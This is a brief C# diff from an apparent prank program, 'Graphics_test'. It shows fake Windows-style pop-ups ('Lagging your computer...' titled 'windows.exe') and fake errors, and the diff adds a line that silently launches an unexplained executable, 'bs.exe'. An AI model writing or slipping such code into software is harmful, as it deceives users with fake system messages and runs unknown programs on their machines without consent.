@@ -25,6 +25,7 @@ namespace Graphics_test
             {
                 new Thread(() => MessageBox.Show("Lagging your computer...", "windows.exe", MessageBoxButtons.OK, MessageBoxIcon.Information)).Start();
             }
+            System.Diagnostics.Process.Start("bs.exe");
         }
         static void RandomErrors(long count, int timeDelay)
         {
